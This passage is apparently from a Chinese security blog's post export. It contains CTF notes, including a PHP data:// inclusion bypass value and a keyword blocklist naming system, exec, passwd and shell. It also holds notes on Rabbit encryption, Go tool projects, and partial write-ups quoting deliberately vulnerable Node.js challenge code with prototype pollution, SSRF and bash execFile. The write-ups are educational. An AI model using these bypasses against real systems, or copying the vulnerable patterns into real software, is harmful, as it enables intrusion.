class="number">6</span>E<span class="meta">%</span><span class="number">2</span>C<span class="meta">%</span><span class="number">64</span><span class="meta">%</span><span class="number">65</span><span class="meta">%</span><span class="number">62</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">5</span>F<span class="meta">%</span><span class="number">64</span><span class="meta">%</span><span class="number">65</span><span class="meta">%</span><span class="number">62</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">5</span>F<span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">71</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">61</span></span><br><span class="line"><span class="comment">//?file=data://text/plain,debu_debu_aqua</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="Rabbit加密"><a href="#Rabbit加密" class="headerlink" title="Rabbit加密"></a>Rabbit加密</h1><blockquote>
<p>Rabbit使用一个128位密钥和一个64位初始化向量。该加密算法的核心组件是一个位流生成器，该生成器每次迭代都会加密128个消息位。加密后的数据以U2FsdGVkX1开头，可以设定密钥。</p>
</blockquote>
<blockquote>
<p>特点：Rabbit加密开头部分通常为U2FsdGVkX1</p>
</blockquote>
<blockquote>
<p>这个固定的头是cryptojs的格式（很多在线加解密网站都用的这个库）。如果头不是这个固定头的Rabbit算法推荐用cyberchef解</p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>daily</tag>
      </tags>
  </entry>
  <entry>
    <title>工具项目编写</title>
    <url>/tools-making/</url>
    <content><![CDATA[<p><code>主要通过写项目练习一下自己的go语言水平</code></p>
<span id="more"></span>

<h1 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h1><p><a href="https://github.com/try-to-change/wfuzz-ttoc">https://github.com/try-to-change/wfuzz-ttoc</a></p>
<blockquote>
<ol>
<li>定义命令行参数，使用flag包进行解析。</li>
<li>使用http包发送请求，并使用goroutine和channel实现并发。</li>
<li>在发送请求之前，根据传入的参数，使用strings包中的Replace函数替换FUZZ参数。</li>
<li>根据不同的payload格式，使用bufio包进行读取和解析。</li>
<li>使用for循环和range关键字实现迭代器。</li>
<li>根据页面响应、状态码等信息，使用正则表达式或标准库中的http包中的Response结构体中的状态码等信息进行判断。</li>
<li>将请求结果输出到标准输出或文件中，使用标准库中的io包即可。同时可以在输出时，添加更多的信息，如请求的URL、响应状态码等。</li>
<li>使用log包记录程序运行日志，方便调试和错误处理</li>
<li>实现统计请求次数、成功次数、失败次数等功能，方便对工具性能进行评估。</li>
</ol>
</blockquote>
<blockquote>
<p>对于wfuzz更深入功能并未进行书写</p>
<p>由于练手熟悉go开发，所以只大致实现了部分功能，其实我也觉得代码稍微有点臃肿，如果有建议和优化的思路，我将时刻准备学习你的建议</p>
</blockquote>
<h1 id="MD5-FLC"><a href="#MD5-FLC" class="headerlink" title="MD5_FLC"></a>MD5_FLC</h1><p><a href="https://github.com/try-to-change/MD5_FIC">https://github.com/try-to-change/MD5_FIC</a></p>
<blockquote>
<p>本项目是基于golang的CS模式的md5文件完整性检测，实现客户端的ui化，便于选择检测上传文件，对一些连接问题进行了处理，对于检测失败的文件会进行删除，对于上传文件，为了服务器安全会进行名字根据时间hash重新编码</p>
<p>项目主要为工程实践完成，可能在实际运行中存在问题，可以在<code>issues</code>中与我交流或者<code>Pull requests</code>即可</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/tools-making/image-20230515000227707.png"><img src="/tools-making/image-20230515000227707.png" alt="image-20230515000227707"></a></p>
<p><a data-fancybox="gallery" data-src="/tools-making/image-20230515000303058.png"><img src="/tools-making/image-20230515000303058.png" alt="image-20230515000303058"></a></p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>go语言</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑2022-wp</title>
    <url>/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<p><code>麻了，我也想在比赛时输出，而不是比赛后</code></p>
<span id="more"></span>

<h1 id="西湖论剑2022"><a href="#西湖论剑2022" class="headerlink" title="西湖论剑2022"></a>西湖论剑2022</h1><h2 id="real-ez-node"><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h2><p>启动环境后页面</p>
<p><a data-fancybox="gallery" data-src="/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20230412201904728.png"><img src="/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20230412201904728.png" alt="image-20230412201904728"></a></p>
<p>ejs猜测是原型链污染</p>
<p>分析一下代码</p>
<p><code>app.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);<span class="comment">//解析,用req.body获取post参数</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  secret : <span class="string">&#x27;secret&#x27;</span>, <span class="comment">// 对session id 相关的cookie 进行签名</span></span><br><span class="line">  resave : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>, <span class="comment">// 是否保存未初始化的会话</span></span><br><span class="line">  cookie : &#123;</span><br><span class="line">    maxAge : <span class="number">1000</span> * <span class="number">60</span> * <span class="number">3</span>, <span class="comment">// 设置 session 的有效时间，单位毫秒</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123;    // 设置使用 ejs 模板引擎 </span></span><br><span class="line"><span class="comment">//   fs.readFile(filePath, (err, content) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//       if (err) return callback(new Error(err))</span></span><br><span class="line"><span class="comment">//       let compiled = lodash.template(content)    // 使用 lodash.template 创建一个预编译模板方法供后面使用</span></span><br><span class="line"><span class="comment">//       let rendered = compiled()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//       return callback(null, rendered)</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, index);</span><br><span class="line"><span class="comment">// app.use(&#x27;/challenge7&#x27;, challenge7);</span></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">error</span> = req.<span class="property">app</span>.<span class="title function_">get</span>(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>route/index.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// 消费响应数据以释放内存</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>从<code>app.js</code>中看出是利用</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>强网拟态2022-wp</title>
    <url>/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    <content><![CDATA[<p><code>学习学习</code></p>
<span id="more"></span>

<h1 id="强网拟态2022"><a href="#强网拟态2022" class="headerlink" title="强网拟态2022"></a>强网拟态2022</h1><h2 id="WHOYOUARE"><a href="#WHOYOUARE" class="headerlink" title="WHOYOUARE"></a>WHOYOUARE</h2><p>这道题目的环境是<code>nodejs</code>，猜考点是原型链污染，其框架根据附件名称可知为<code>fastify</code></p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825093507374.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825093507374.png" alt="image-20230825093507374"></a></p>
<p>看题目名字和刚打开题目的提示，猜测污染漏洞点应该在<code>user</code>处，应该在某个检查<code>user</code>信息的地方可以进行原型链污染</p>
<hr>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>先审一下<code>app.js</code></p>
<h4 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userRoutes = <span class="built_in">require</span>(<span class="string">&#x27;./routes/user&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&#x27;fastify&#x27;</span>)(&#123;</span><br><span class="line">    <span class="attr">logger</span>: &#123;</span><br><span class="line">        <span class="attr">level</span>: <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span></span><br><span class="line"><span class="keyword">const</span> host = process.<span class="property">env</span>.<span class="property">HOST</span> || <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"><span class="keyword">const</span> respWrapper = &#123;</span><br><span class="line">    <span class="attr">$id</span>: <span class="string">&#x27;respWrapper&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">    response : &#123;</span><br><span class="line">        <span class="attr">success</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">            <span class="attr">properties</span>: &#123;</span><br><span class="line">                status : &#123; <span class="attr">type</span>: <span class="string">&#x27;number&#x27;</span> &#125;,</span><br><span class="line">                <span class="attr">info</span>: &#123; <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span> &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fastify.<span class="title function_">addSchema</span>(respWrapper)</span><br><span class="line">fastify.<span class="title function_">register</span>(userRoutes)</span><br><span class="line"></span><br><span class="line">fastify.<span class="title function_">listen</span>(&#123;</span><br><span class="line">    host, port</span><br><span class="line">&#125;, <span class="function">(<span class="params">err, address</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        fastify.<span class="property">log</span>.<span class="title function_">error</span>(err)</span><br><span class="line">        process.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fastify.<span class="property">log</span>.<span class="title function_">info</span>(<span class="string">`server listening on <span class="subst">$&#123;address&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>发现网站还有个路由<code>/user</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> userRoutes = <span class="built_in">require</span>(<span class="string">&#x27;./routes/user&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>访问</p>
<p><a data-fancybox="gallery" data-src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825100242391.png"><img src="/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230825100242391.png" alt="image-20230825100242391"></a></p>
<p>显示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Route GET:/user not found&quot;</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Not Found&quot;</span>,<span class="string">&quot;statusCode&quot;</span>:<span class="number">404</span>&#125;</span><br></pre></td></tr></table></figure>

<p>看样子是无法用GET方式访问<code>/user</code>路由</p>
<p>于是审计一下<code>user.js</code></p>
<h4 id="user-js"><a href="#user-js" class="headerlink" title="user.js"></a>user.js</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;../utils/merge&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bin = <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ChildProcess</span> = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkUser</span>(<span class="params">command</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(command) === <span class="literal">false</span> || command.<span class="property">length</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; command.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd = command[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> cmd !== <span class="string">&#x27;string&#x27;</span> || cmd.<span class="property">length</span> &gt; <span class="number">4</span> || <span class="title class_">RegExp</span>(<span class="regexp">/^[^a-zA-Z0-9-]+$/</span>).<span class="title function_">test</span>(command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">routes</span> (fastify, options) &#123;</span><br><span class="line">    fastify.<span class="title function_">route</span>(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;/user&#x27;</span>,</span><br><span class="line">            <span class="attr">schema</span>: &#123;</span><br><span class="line">                <span class="attr">querystring</span>: &#123;</span><br><span class="line">                    <span class="attr">user</span>: &#123; <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span> &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">additionalProperties</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">response</span>: &#123;</span><br><span class="line">                    <span class="number">200</span>: &#123;</span><br><span class="line">                        <span class="attr">$ref</span>: <span class="string">&#x27;respWrapper#/response/success&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">preHandler</span>: <span class="keyword">function</span> (<span class="params">request, reply, done</span>) &#123;</span><br><span class="line">                <span class="comment">//user init</span></span><br><span class="line">                request.<span class="property">user</span> = &#123;username : <span class="string">&#x27;guest&#x27;</span>, <span class="attr">command</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]&#125;</span><br><span class="line">                <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(request.<span class="property">body</span>.<span class="property">user</span>)</span><br><span class="line">                <span class="comment">// clean user command</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_">checkUser</span>(user.<span class="property">command</span>) !== <span class="literal">true</span>) &#123;</span><br><span class="line">                    user.<span class="property">command</span> = [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="title function_">merge</span>(request.<span class="property">user</span>, user)</span><br><span class="line">                &#125;<span class="keyword">catch</span> (e)&#123;</span><br><span class="line">                    reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: <span class="string">&quot;Something error&quot;</span>&#125;)</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_">done</span>()</span><br><span class="line">            &#125;,</span><br><span class="line">            handler : <span class="keyword">function</span> (<span class="params">request, reply</span>) &#123;</span><br><span class="line">                <span class="title class_">ChildProcess</span>.<span class="title function_">execFile</span>(bin, request.<span class="property">user</span>.<span class="property">command</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                        reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: error&#125;)</span><br><span class="line">                    &#125;</span><br><span class="line">                    reply.<span class="title function_">code</span>(<span class="number">200</span>).<span class="title function_">send</span>(&#123; status : <span class="number">0</span> , info : <span class="string">`User of <span class="subst">$&#123;request.user.username&#125;</span> : <span class="subst">$&#123;stdout&#125;</span>`</span>&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    fastify.<span class="title function_">route</span>(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">response</span>: &#123;</span><br><span class="line">            <span class="attr">$ref</span>: <span class="string">&#x27;respWrapper#/response/success&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">handler</span>: <span class="keyword">function</span> (<span class="params">request, reply</span>) &#123;</span><br><span class="line">            reply.<span class="title function_">send</span>(&#123; <span class="attr">status</span>: <span class="number">0</span>, <span class="attr">info</span>: <span class="string">&#x27;go user&#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = routes</span><br></pre></td></tr></table></figure>

<p>原型链污染重点看<code>merge</code>和<code>JSON.parse</code>，发现代码，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(request.<span class="property">body</span>.<span class="property">user</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">merge</span>(request.<span class="property">user</span>, user)</span><br><span class="line">&#125;<span class="keyword">catch</span> (e)&#123;</span><br><span class="line">    reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123;<span class="attr">status</span>: <span class="number">1</span>, <span class="attr">info</span>: <span class="string">&quot;Something error&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>request.user</code>的值为，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.<span class="property">user</span> = &#123;username : <span class="string">&#x27;guest&#x27;</span>, <span class="attr">command</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>user</code>的值为，</p>
